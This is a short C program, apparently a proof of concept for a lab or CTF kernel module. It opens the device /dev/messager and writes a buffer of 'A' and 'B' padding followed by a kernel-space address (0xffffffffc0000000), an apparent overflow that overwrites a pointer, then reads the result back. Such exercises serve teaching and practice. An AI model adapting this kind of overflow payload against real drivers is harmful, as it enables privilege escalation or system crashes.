#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

int main(void)
{
    int fd = open("/dev/messager", O_RDWR);
    if (fd < 0)
    {
        puts("[!] Failed to open the device");
        return errno;
    }
    puts("[+] Successfully opened the device");

    char *msg = malloc(512);
    for (int i = 0; i < 256; i++)
    {
        msg[i] = 'A';
    }
    for (int i = 256; i < 256+8; i++)
    {
        msg[i] = 'B';
    }
    msg[256 + 8] = 0x00;
    msg[256 + 9] = 0x00;
    msg[256 + 10] = 0x00;
    msg[256 + 11] = 0xc0;
    msg[256 + 12] = 0xff;
    msg[256 + 13] = 0xff;
    msg[256 + 14] = 0xff;
    msg[256 + 15] = 0xff;

    int ret = write(fd, msg, 512);
    free(msg);

    if (ret < 0)
    {
        puts("[!] Failed to write to the device");
        return errno;
    }
    puts("[+] Successfully wrote to the device");

    char buf[256];
    ret = read(fd, buf, sizeof(buf));
    if (ret < 0)
    {
        puts("[!] Failed to read from the device");
        return errno;
    }
    puts("[+] Successfully read from the device");
    printf("[+] Read: %s\n", buf);
    
    close(fd);
    
    return 0;
}